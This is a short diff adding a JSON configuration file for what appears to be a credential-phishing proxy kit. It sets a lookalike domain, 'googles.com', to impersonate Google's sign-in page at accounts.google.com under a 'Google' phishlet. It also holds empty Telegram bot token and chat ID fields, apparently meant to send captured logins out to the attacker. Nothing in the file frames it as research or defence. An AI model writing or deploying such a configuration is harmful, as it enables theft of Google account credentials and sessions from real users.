@@ -1,0 +1,10 @@
+{
+  "domain": "googles.com",
+  "ip": "127.0.0.1",
+  "target": "https://accounts.google.com",
+  "port": 1000,
+  "scheme": "https",
+  "phishlet": "Google",
+  "telegramBotToken": ":",
+  "telegramChatId": ""
+}
